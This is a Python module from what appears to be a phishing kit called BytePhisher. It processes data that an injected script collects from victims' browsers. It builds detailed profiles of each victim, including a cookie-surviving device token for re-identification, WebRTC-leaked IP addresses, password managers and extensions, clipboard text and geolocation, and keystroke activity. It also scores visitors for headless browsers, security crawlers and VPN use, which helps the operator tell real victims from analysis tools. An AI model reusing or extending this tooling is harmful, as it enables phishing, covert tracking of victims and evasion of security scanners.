# BytePhisher — deep device-intelligence engine.
#
# Receives the browser collector's waves (assets/intel.js), merges them per
# session, derives the conclusions an operator actually needs (is this a real
# human on a real device, which device, which browser, is it a VM/emulator/
# headless bot, is the network a VPN/proxy, what can it decode, which fonts and
# extensions are installed), and hands a normalised record to the capture store.
#
# Everything here is derived from data the victim's own browser volunteered to
# the page: no exploitation, no persistence, no cross-origin access.
import hashlib
import json
import re
import time

INTEL_PATH = "/__bh/intel"          # proxy mode + static mode endpoint
INTEL_JS_PATH = "/__bh/intel.js"    # collector script
INTEL_ALIAS = "/intel"              # short alias

# ---------------------------------------------------------------- helpers ---
BOT_UA_MARKERS = (
    "headlesschrome", "phantomjs", "slimerjs", "selenium", "webdriver",
    "puppeteer", "playwright", "python-requests", "python-urllib", "curl/",
    "wget/", "httpie", "go-http-client", "java/", "okhttp", "libwww-perl",
    "scrapy", "node-fetch", "axios/", "googlebot", "bingbot", "yandexbot",
    "duckduckbot", "baiduspider", "ahrefsbot", "semrushbot", "mj12bot",
    "facebookexternalhit", "slackbot", "telegrambot", "whatsapp", "discordbot",
    "bot/", "spider/", "crawler",
)

# renderers that only exist in software rendering = VM / emulator / headless
SOFTWARE_GL = ("swiftshader", "llvmpipe", "softpipe", "mesa offscreen",
               "microsoft basic render", "apple software renderer",
               "virtualbox", "vmware svga", "virgl", "google inc. (google)")

MOBILE_UA = ("iphone", "ipod", "android", "mobile", "windows phone", "blackberry")
TABLET_UA = ("ipad", "tablet", "kindle", "silk", "playbook")


def _h(s):
    return hashlib.sha256(str(s).encode("utf-8", "replace")).hexdigest()


def _pick(d, *keys, default=None):
    """First present, non-empty value among dotted keys (a.b.c)."""
    for k in keys:
        cur, ok = d, True
        for part in k.split("."):
            if isinstance(cur, dict) and part in cur:
                cur = cur[part]
            else:
                ok = False
                break
        if ok and cur not in (None, "", [], {}):
            return cur
    return default


def _mods(payload):
    return (payload or {}).get("mods") or {}


def merge_waves(existing, payload):
    """Merge one collector wave into the accumulated module map.

    A later wave only overwrites a module when it actually carries data, so an
    async probe that timed out never erases what an earlier wave already got.
    """
    acc = dict(existing or {})
    mods = _mods(payload)
    for k, v in mods.items():
        if v in (None, "", [], {}):
            continue
        if isinstance(v, dict) and isinstance(acc.get(k), dict):
            merged = dict(acc[k])
            merged.update(v)
            acc[k] = merged
        else:
            acc[k] = v
    errs = dict(acc.get("_errors") or {})
    errs.update(payload.get("errors") or {})
    # a module that succeeded in a later wave is no longer a failure — without
    # this the dump keeps showing stale errors from the first wave forever
    for k in mods:
        if mods[k] not in (None, "", [], {}) and not k.startswith("_"):
            errs.pop(k, None)
    if errs:
        acc["_errors"] = errs
    acc["_waves"] = list(acc.get("_waves") or []) + [payload.get("wave")]
    acc["_last_wave_ts"] = payload.get("ts")
    return acc


# ------------------------------------------------------------- conclusions ---
def guess_browser(mods, ua=""):
    ua = ua or _pick(mods, "nav.ua", default="") or ""
    ual = ua.lower()
    f = _pick(mods, "features", default={}) or {}
    if f.get("Electron"):
        return "electron"
    if f.get("NodeJS") and f.get("ChromeRuntime"):
        return "node/electron"
    if f.get("Brave") or "brave" in ual:
        return "brave"
    if "edg/" in ual or "edge" in ual:
        return "edge"
    if f.get("Opera") or "opr/" in ual:
        return "opera"
    if f.get("Firefox") or "firefox" in ual:
        return "firefox"
    if (f.get("Safari") or ("safari" in ual and "chrom" not in ual)) and "chrome" not in ual:
        return "safari"
    if "chrome" in ual or f.get("ChromeRuntime"):
        return "chrome"
    if "samsungbrowser" in ual:
        return "samsung-internet"
    if "ucbrowser" in ual:
        return "ucbrowser"
    return "unknown"


def guess_os(mods, ua=""):
    ua = ua or _pick(mods, "nav.ua", default="") or ""
    plat = (_pick(mods, "nav.platform", default="") or "") + " " + \
           (_pick(mods, "uaDataHigh.platform", "nav.uaData.platform", default="") or "")
    ual = (ua + " " + plat).lower()
    if "android" in ual:
        return "android"
    if "iphone" in ual or "ipad" in ual or "ios" in ual or "macintel" in ual and _pick(mods, "screen.dpr", default=0) >= 2 and _pick(mods, "screen.orientation.type", default="") and "touch" in str(_pick(mods, "nav.maxTouchPoints", default=0)):
        return "ios"
    if "win" in ual:
        return "windows"
    if "mac" in ual or "darwin" in ual:
        return "macos"
    if "cros" in ual:
        return "chromeos"
    if "linux" in ual or "x11" in ual:
        return "linux"
    return "unknown"


def device_class(mods, ua=""):
    ua = ua or _pick(mods, "nav.ua", default="") or ""
    ual = ua.lower()
    touch = int(_pick(mods, "nav.maxTouchPoints", default=0) or 0)
    uad = _pick(mods, "nav.uaData", default={}) or {}
    if uad.get("mobile") is True:
        return "mobile"
    # explicit UA tokens win over the screen-size heuristic: an iPhone reporting
    # a 1920px viewport is still a phone, not a tablet
    if any(m in ual for m in TABLET_UA):
        return "tablet"
    if any(m in ual for m in MOBILE_UA):
        return "mobile"
    if touch > 1 and int(_pick(mods, "screen.width", default=0) or 0) >= 768:
        return "tablet"
    return "desktop"


def headless_score(mods, ua="", device=""):
    """0-100 likelihood this is automation, with the evidence that produced it.

    Weights come from signals that differ between a real browser and a driver:
    the WebDriver flag, missing plugin/mime arrays, a software GL renderer,
    driver globals, impossible permission states, and a UA that admits it.
    """
    s, reasons = 0, []
    f = _pick(mods, "features", default={}) or {}
    auto = _pick(mods, "automation", default={}) or {}
    cons = (auto.get("consistency") or {})
    ua = ua or _pick(mods, "nav.ua", default="") or ""
    ual = ua.lower()

    if any(m in ual for m in BOT_UA_MARKERS):
        s += 55
        reasons.append(f"automation/scanner user-agent: {ua[:80]}")
    if _pick(mods, "nav.webdriver") is True or f.get("WebDriverFlag"):
        s += 45
        reasons.append("navigator.webdriver = true (driver-controlled browser)")
    if auto.get("artifacts"):
        s += 40
        reasons.append("driver globals present: " + ", ".join(map(str, auto["artifacts"][:6])))
    if f.get("Selenium"):
        s += 40
        reasons.append("Selenium artefacts ($cdc_ / webdriver attribute)")
    if f.get("Puppeteer") or f.get("Playwright") or f.get("Phantom") or f.get("Nightmare"):
        s += 40
        reasons.append("headless driver marker (puppeteer/playwright/phantom/nightmare)")
    if f.get("HeadlessChrome") or f.get("Headless"):
        s += 35
        reasons.append("user-agent announces a headless build")
    if f.get("NodeJS") or f.get("Electron"):
        s += 25
        reasons.append("runtime is Node/Electron, not a normal browser")
    gl = _renderers(mods)
    for r in gl:
        if any(x in str(r).lower() for x in SOFTWARE_GL):
            s += 35
            reasons.append(f"software/virtual GPU renderer: {r}")
            break
    if cons.get("pluginsNonEmpty") is False:
        s += 20
        reasons.append("navigator.plugins is empty (real Chrome/Edge always expose PDF plugins)")
    if cons.get("mimeTypesNonEmpty") is False:
        s += 15
        reasons.append("navigator.mimeTypes is empty")
    if cons.get("languagesNonEmpty") is False:
        s += 15
        reasons.append("navigator.languages is empty")
    if cons.get("hasChromeObject") is False and "chrome" in ual:
        s += 20
        reasons.append("claims Chrome but window.chrome is missing")
    if cons.get("chromeRuntime") is False and "chrome" in ual:
        s += 10
        reasons.append("claims Chrome but chrome.runtime is missing")
    perms = _pick(mods, "permissions", default={}) or {}
    if perms and all(v == "denied" for k, v in perms.items() if k != "unsupported"):
        s += 20
        reasons.append("every permission query returns denied (headless default)")
    if _pick(mods, "nav.hardwareConcurrency", default=0) in (0, 1):
        s += 10
        reasons.append("hardwareConcurrency <= 1")
    if _pick(mods, "nav.deviceMemory") in (None, 0, 0.25):
        s += 8
        reasons.append("no device memory reported")
    scr = _pick(mods, "screen.width", default=0) or 0
    if scr in (800, 1024, 1280) and _pick(mods, "screen.height") in (600, 768, 720):
        s += 12
        reasons.append(f"default virtual-screen resolution {scr}x{_pick(mods, 'screen.height')}")
    if _pick(mods, "canvas.blank") is True:
        s += 20
        reasons.append("canvas renders blank (blocked or faked)")
    if _pick(mods, "canvas") is None:
        s += 10
        reasons.append("no canvas data collected (JS blocked or headless)")
    if not _pick(mods, "fonts.present"):
        s += 12
        reasons.append("no system fonts detected")
    return min(100, s), reasons


def _renderers(mods):
    out = []
    for ctx in (_pick(mods, "webgl.contexts", default=[]) or []):
        for k in ("unmaskedRenderer", "renderer", "unmaskedVendor", "vendor"):
            if ctx.get(k):
                out.append(ctx[k])
    return out


def webrtc_ips(mods):
    ips = _pick(mods, "webrtc.ips", default=[]) or []
    pub, local = [], []
    for ip in ips:
        if re.match(r"^(10\.|127\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|169\.254\.|fe80:|::1$|f[cd])", str(ip), re.I):
            local.append(ip)
        elif ".local" in str(ip):
            local.append(ip)
        else:
            pub.append(ip)
    return pub, local


def vpn_assessment(mods, server_ip="", geo_country="", ua=""):
    """Best-effort network assessment — labelled SUSPECTED, never asserted."""
    reasons, score = [], 0
    pub, local = webrtc_ips(mods)
    if pub and server_ip and server_ip not in pub:
        score += 45
        reasons.append(f"WebRTC reveals a different public IP ({', '.join(pub[:3])}) "
                       f"than the HTTP source ({server_ip}) — VPN/proxy or NAT chaining")
    types = _pick(mods, "webrtc.types", default={}) or {}
    if types and not types.get("host") and not types.get("srflx"):
        score += 20
        reasons.append("only relay ICE candidates — traffic is being tunnelled")
    tz = _pick(mods, "time.intl.timeZone", "time.tz", default="") or ""
    country = (geo_country or "").upper()
    tz_country_hints = {
        "Asia/Kolkata": ("IN",), "Asia/Calcutta": ("IN",), "Asia/Karachi": ("PK",),
        "Asia/Dhaka": ("BD",), "Asia/Dubai": ("AE",), "Europe/London": ("GB",),
        "Europe/Berlin": ("DE",), "Europe/Paris": ("FR",), "Europe/Moscow": ("RU",),
        "America/New_York": ("US",), "America/Chicago": ("US",), "America/Los_Angeles": ("US",),
        "Asia/Tokyo": ("JP",), "Asia/Shanghai": ("CN",), "Asia/Singapore": ("SG",),
        "Australia/Sydney": ("AU",), "America/Sao_Paulo": ("BR",),
    }
    hints = tz_country_hints.get(tz)
    if hints and country and country not in hints:
        score += 30
        reasons.append(f"browser timezone {tz} does not match the IP country {country}")
    langs = _pick(mods, "nav.languages", default=[]) or []
    if langs and country:
        lang_country = {"hi": "IN", "en-IN": "IN", "de": "DE", "fr": "FR", "ru": "RU",
                        "ja": "JP", "zh": "CN", "es": "ES", "pt": "BR", "ar": "AE"}
        first = str(langs[0]).split("-")[0]
        expect = lang_country.get(str(langs[0])) or lang_country.get(first)
        if expect and expect != country:
            score += 15
            reasons.append(f"browser language {langs[0]} does not match the IP country {country}")
    return min(100, score), reasons


def device_token(mods):
    """Stable per-device identifier for re-identification across visits.

    Built from signals that survive cookie clearing: canvas, audio, GPU, CPU,
    fonts, screen, timezone, platform. Two visits from the same machine produce
    the same token; a re-imaged or spoofed browser does not.
    """
    parts = [
        _pick(mods, "canvas.fullHash", default=""),
        _pick(mods, "canvas.dataURL", default=""),
        json.dumps(_pick(mods, "audio.sum", default="")),
        json.dumps(_renderers(mods)[:2]),
        _pick(mods, "nav.platform", default=""),
        _pick(mods, "nav.hardwareConcurrency", default=""),
        _pick(mods, "nav.deviceMemory", default=""),
        json.dumps(_pick(mods, "fonts.present", default=[])[:40]),
        json.dumps(_pick(mods, "math", default={})),
        f"{_pick(mods, 'screen.width', default='')}x{_pick(mods, 'screen.height', default='')}x"
        f"{_pick(mods, 'screen.colorDepth', default='')}",
        _pick(mods, "time.intl.timeZone", default=""),
        _pick(mods, "nav.maxTouchPoints", default=""),
    ]
    return _h("|".join(str(p) for p in parts))[:32]


def summarize(mods, ua="", server_ip="", geo_country=""):
    """One normalised record: everything a human wants to read, plus the raw map.

    The UA the *browser* reported wins over the HTTP header: a proxy, a privacy
    extension or a scripted client can send any header, while `navigator.userAgent`
    is what the page actually sees. (Found live: a short header UA made a real
    Chrome/Mac profile classify as "unknown".)
    """
    ua = _pick(mods, "nav.ua", default="") or ua or ""
    hl, hl_reasons = headless_score(mods, ua)
    vpn, vpn_reasons = vpn_assessment(mods, server_ip, geo_country, ua)
    auto = _pick(mods, "automation", default={}) or {}
    pub_ips, local_ips = webrtc_ips(mods)
    fonts = _pick(mods, "fonts", default={}) or {}
    feats = _pick(mods, "features", default={}) or {}
    ctx0 = ((_pick(mods, "webgl.contexts", default=[]) or [{}]) or [{}])[0] or {}
    rec = {
        "collected_at": time.time(),
        "browser": guess_browser(mods, ua),
        "os": guess_os(mods, ua),
        "device_class": device_class(mods, ua),
        "user_agent": ua,
        "ua_high_entropy": _pick(mods, "uaDataHigh", default=None),
        "platform": _pick(mods, "nav.platform"),
        "languages": _pick(mods, "nav.languages", default=[]),
        "language": _pick(mods, "nav.language"),
        "timezone": _pick(mods, "time.intl.timeZone", "time.tz"),
        "locale": _pick(mods, "time.intl.locale"),
        "tz_offset_min": _pick(mods, "time.tzOffsetMin"),
        "screen": {
            "size": f"{_pick(mods, 'screen.width')}x{_pick(mods, 'screen.height')}",
            "viewport": f"{_pick(mods, 'screen.innerW')}x{_pick(mods, 'screen.innerH')}",
            "window": (f"{_pick(mods, 'screen.outerW')}x{_pick(mods, 'screen.outerH')}"
                       if _pick(mods, "screen.outerW") and _pick(mods, "screen.outerH") else None),
            "dpr": _pick(mods, "screen.dpr"),
            "depth": _pick(mods, "screen.colorDepth"),
            "orientation": _pick(mods, "screen.orientation.type"),
            "multi_monitor": _pick(mods, "screenDetails.count") or _pick(mods, "screen.isExtended"),
            "media_queries": _pick(mods, "screen.mediaQueries", default={}),
        },
        "hardware": {
            "cores": _pick(mods, "nav.hardwareConcurrency"),
            "memory_gb": _pick(mods, "nav.deviceMemory"),
            "touch_points": _pick(mods, "nav.maxTouchPoints"),
            "gpu_vendor": ctx0.get("unmaskedVendor") or ctx0.get("vendor"),
            "gpu_renderer": ctx0.get("unmaskedRenderer") or ctx0.get("renderer"),
            "gl_version": ctx0.get("version"),
            "gl_extensions": ctx0.get("extensionCount"),
            "webgpu": _pick(mods, "webgpu.info"),
            "js_heap_limit": _pick(mods, "net.memory.jsHeapLimit"),
            "battery": _pick(mods, "battery"),
        },
        "fingerprint": {
            "device_token": device_token(mods),
            "canvas_hash": _pick(mods, "canvas.dataURL"),
            "canvas_blank": _pick(mods, "canvas.blank"),
            "audio_sum": _pick(mods, "audio.sum"),
            "fonts_count": fonts.get("count"),
            "fonts": (fonts.get("present") or [])[:80],
            "local_fonts": _pick(mods, "localFonts.count"),
            "math_print": _pick(mods, "math"),
        },
        "network": {
            "webrtc_public_ips": pub_ips,
            "webrtc_local_ips": local_ips,
            "ice_types": _pick(mods, "webrtc.types"),
            "mdns_obfuscated": _pick(mods, "webrtc.mdns"),
            "connection": _pick(mods, "net.type") or _pick(mods, "net.effectiveType"),
            "downlink_mbps": _pick(mods, "net.downlink"),
            "rtt_ms": _pick(mods, "net.rtt"),
            "save_data": _pick(mods, "net.saveData"),
            "timing": _pick(mods, "net.timing"),
        },
        "capabilities": {
            "supported_count": feats.get("supportedCount"),
            "total_checked": feats.get("total"),
            "codecs": _pick(mods, "codecs", default={}),
            "drm": _pick(mods, "drm"),
            "media_devices": _pick(mods, "mediaDevices.kinds"),
            "device_labels_visible": _pick(mods, "mediaDevices.labelsVisible"),
            "permissions": _pick(mods, "permissions", default={}),
            "storage_quota_mb": (lambda q: round((q or 0) / 1048576, 1) if q else None)(
                _pick(mods, "quota.quota")),
            "storage_used_mb": (lambda q: round((q or 0) / 1048576, 2) if q else None)(
                _pick(mods, "quota.usage")),
            "webgl2": bool((_pick(mods, "webgl.contexts", default=[]) or [{}])[0].get("kind") == "webgl2"),
            "gamepads": _pick(mods, "gamepads.count"),
            "supported_apis": (feats.get("supported") or [])[:120],
            "missing_apis": (feats.get("missing") or [])[:60],
        },
        "environment": {
            "extensions": auto.get("extensionScripts") or [],
            "password_managers": auto.get("passwordManagerMarkers") or [],
            "adblock_suspected": (_pick(mods, "automation.baits.baitHidden") is True
                                  or _pick(mods, "adblock.blocked") is True),
            "adblock_probe": _pick(mods, "adblock"),
            "driver_artifacts": auto.get("artifacts") or [],
            "incognito_suspected": (bool(_pick(mods, "storage.local") is False)
                                    or _pick(mods, "quota.quota") in (0, None) and
                                    _pick(mods, "storage.local") is False),
        },
        "automation": {"headless_score": hl, "headless_reasons": hl_reasons},
        "network_risk": {"vpn_suspected_score": vpn, "vpn_reasons": vpn_reasons},
        "behaviour": _pick(mods, "behaviour"),
        "page": _pick(mods, "page"),
        "geo": _pick(mods, "geolocation"),
        "clipboard": _pick(mods, "clipboard"),
        "notifications": _pick(mods, "notifications"),
        "usb_serial_hid": _pick(mods, "usbSerialHid"),
        "errors": mods.get("_errors") or {},
        "waves": mods.get("_waves") or [],
        "modules_collected": sorted(k for k in mods.keys() if not k.startswith("_")),
    }
    return rec


def risk_from_intel(rec, base=0):
    """Fold the intelligence into the same 0-100 risk scale the captures use."""
    s = int(base or 0)
    hl = int((rec.get("automation") or {}).get("headless_score") or 0)
    s = max(s, hl)
    vpn = int((rec.get("network_risk") or {}).get("vpn_suspected_score") or 0)
    if vpn >= 30:
        s = min(100, s + 20)
    return min(100, s)


def render_js(path, sid, perms=False, endpoint=INTEL_PATH):
    """The collector, with the session id, endpoint and permission switch bound."""
    with open(path, encoding="utf-8") as f:
        js = f.read()
    return (js.replace("__SID__", sid)
              .replace("__INTEL__", endpoint)
              .replace("__PERMS__", "true" if perms else "false"))


def tag(perms=False, endpoint=INTEL_PATH, sid="__SID__"):
    """The <script> tag the servers inject into every page they serve."""
    return (f'<script src="{INTEL_JS_PATH}?s={sid}&p={1 if perms else 0}" '
            f'data-intel="{endpoint}" defer></script>')


def dump_text(rec, width=78):
    """Human-readable full dump for the CLI (`--intel-dump`)."""
    L = []
    add = L.append

    def kv(k, v, indent=2):
        if v in (None, "", [], {}):
            return
        add(" " * indent + f"{k:<22} {v}")

    add("=" * width)
    add("BYTEPHISHER — FULL DEVICE DUMP")
    add("=" * width)
    kv("session", rec.get("sid"))
    kv("captured", time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(rec.get("collected_at") or time.time())))
    kv("source IP", rec.get("ip"))
    kv("geo", ", ".join(x for x in [rec.get("city"), rec.get("country"), rec.get("isp")] if x))
    kv("device token", (rec.get("fingerprint") or {}).get("device_token"))
    kv("risk", rec.get("risk"))
    kv("headless score", (rec.get("automation") or {}).get("headless_score"))
    kv("vpn suspicion", (rec.get("network_risk") or {}).get("vpn_suspected_score"))

    add("")
    add("-- IDENTITY " + "-" * (width - 13))
    for k in ("browser", "os", "device_class", "platform", "language", "languages",
              "timezone", "locale", "tz_offset_min"):
        kv(k, rec.get(k))
    kv("user agent", rec.get("user_agent"))
    uah = rec.get("ua_high_entropy")
    if uah:
        kv("ua arch", uah.get("architecture"))
        kv("ua bitness", uah.get("bitness"))
        kv("ua model", uah.get("model"))
        kv("ua platform ver", uah.get("platformVersion"))
        kv("ua full version", uah.get("uaFullVersion") or uah.get("uaFullVersion"))
        kv("ua wow64", uah.get("wow64"))

    scr = rec.get("screen") or {}
    add("")
    add("-- DISPLAY " + "-" * (width - 12))
    kv("resolution", scr.get("size"))
    kv("viewport", scr.get("viewport"))
    kv("window size", scr.get("window"))
    kv("device pixel ratio", scr.get("dpr"))
    kv("colour depth", scr.get("depth"))
    kv("orientation", scr.get("orientation"))
    kv("monitors", scr.get("multi_monitor"))
    if scr.get("media_queries"):
        kv("dark mode", scr["media_queries"].get("(prefers-color-scheme: dark)"))
        kv("reduced motion", scr["media_queries"].get("(prefers-reduced-motion: reduce)"))

    hw = rec.get("hardware") or {}
    add("")
    add("-- HARDWARE " + "-" * (width - 13))
    kv("cpu cores", hw.get("cores"))
    kv("device memory", hw.get("memory_gb"))
    kv("touch points", hw.get("touch_points"))
    kv("gpu vendor", hw.get("gpu_vendor"))
    kv("gpu renderer", hw.get("gpu_renderer"))
    kv("gl version", hw.get("gl_version"))
    kv("gl extensions", hw.get("gl_extensions"))
    kv("webgpu", hw.get("webgpu"))
    if hw.get("battery"):
        b = hw["battery"]
        kv("battery", f"{round((b.get('level') or 0) * 100)}% charging={b.get('charging')}")
    if hw.get("js_heap_limit"):
        kv("js heap limit", f"{round(hw['js_heap_limit'] / 1048576)} MB")

    fp = rec.get("fingerprint") or {}
    add("")
    add("-- FINGERPRINT " + "-" * (width - 16))
    kv("canvas hash", fp.get("canvas_hash"))
    kv("canvas blank", fp.get("canvas_blank"))
    kv("audio sum", fp.get("audio_sum"))
    kv("fonts installed", f"{fp.get('fonts_count')} detected"
                          + (f" (local fonts API: {fp.get('local_fonts')})" if fp.get("local_fonts") else ""))
    if fp.get("fonts"):
        for i in range(0, len(fp["fonts"]), 4):
            add(" " * 4 + ", ".join(fp["fonts"][i:i + 4]))
    if fp.get("math_print"):
        add(" " * 4 + "math print: " + ", ".join(f"{k}={v}" for k, v in list(fp["math_print"].items())[:6]))

    net = rec.get("network") or {}
    add("")
    add("-- NETWORK " + "-" * (width - 12))
    kv("webrtc public IP", ", ".join(net.get("webrtc_public_ips") or []) or None)
    kv("webrtc local IP", ", ".join(net.get("webrtc_local_ips") or []) or None)
    kv("ice candidates", net.get("ice_types"))
    kv("mdns hidden", net.get("mdns_obfuscated"))
    kv("connection type", net.get("connection"))
    kv("downlink", net.get("downlink_mbps"))
    kv("rtt", net.get("rtt_ms"))
    if net.get("timing"):
        t = net["timing"]
        kv("timing", f"dns={t.get('dns')}ms tcp={t.get('tcp')}ms tls={t.get('tls')}ms "
                     f"ttfb={t.get('ttfb')}ms load={t.get('load')}ms next={t.get('nextHop')}")

    cap = rec.get("capabilities") or {}
    add("")
    add("-- CAPABILITIES " + "-" * (width - 17))
    kv("APIs supported", f"{cap.get('supported_count')}/{cap.get('total_checked')}")
    if cap.get("storage_quota_mb"):
        kv("storage quota", f"{cap['storage_quota_mb']} MB (used {cap.get('storage_used_mb')} MB)")
    kv("media devices", cap.get("media_devices"))
    kv("device labels", cap.get("device_labels_visible"))
    kv("webgl2", cap.get("webgl2"))
    kv("gamepads", cap.get("gamepads"))
    if cap.get("codecs"):
        good = [k for k, v in cap["codecs"].items() if v in ("probably", "maybe", True)]
        kv("codecs", ", ".join(good))
    if cap.get("drm"):
        kv("drm", ", ".join(k for k, v in cap["drm"].items() if v))
    if cap.get("permissions"):
        kv("permissions", ", ".join(f"{k}={v}" for k, v in cap["permissions"].items() if v != "unsupported"))
    if cap.get("missing_apis"):
        kv("missing APIs", ", ".join(cap["missing_apis"][:12]))

    env = rec.get("environment") or {}
    add("")
    add("-- ENVIRONMENT " + "-" * (width - 15))
    kv("adblock suspected", env.get("adblock_suspected"))
    kv("password managers", ", ".join(env.get("password_managers") or []) or None)
    kv("extension scripts", ", ".join(env.get("extensions") or []) or None)
    kv("driver artefacts", ", ".join(map(str, env.get("driver_artifacts") or [])) or None)
    kv("private/incognito?", env.get("incognito_suspected"))

    au = rec.get("automation") or {}
    if au.get("headless_reasons"):
        add("")
        add("-- AUTOMATION EVIDENCE " + "-" * (width - 24))
        for r in au["headless_reasons"]:
            add("  * " + r)
    nr = rec.get("network_risk") or {}
    if nr.get("vpn_reasons"):
        add("")
        add("-- NETWORK EVIDENCE " + "-" * (width - 21))
        for r in nr["vpn_reasons"]:
            add("  * " + r)
    geo = rec.get("geo")
    if geo:
        add("")
        add("-- PERMISSION-GATED DATA " + "-" * (width - 26))
        kv("geolocation", geo)
        kv("clipboard", (rec.get("clipboard") or {}).get("text"))
        kv("notifications", rec.get("notifications"))
        kv("usb/serial/hid", rec.get("usb_serial_hid"))
    beh = rec.get("behaviour")
    if beh:
        add("")
        add("-- BEHAVIOUR " + "-" * (width - 13))
        kv("mouse moves", beh.get("moves"))
        kv("keystrokes", beh.get("keys"))
        kv("clicks", beh.get("clicks"))
        kv("scrolls", beh.get("scrolls"))
        kv("max scroll", f"{beh.get('maxScrollDepth')}%")
        kv("time on page", f"{round((beh.get('activeMs') or 0) / 1000)}s")
    err = rec.get("errors") or {}
    if err:
        add("")
        add("-- MODULES THAT FAILED " + "-" * (width - 24))
        for k, v in list(err.items())[:15]:
            kv(k, v)
    add("")
    kv("modules collected", len(rec.get("modules_collected") or []))
    kv("waves", rec.get("waves"))
    add("=" * width)
    return "\n".join(L)
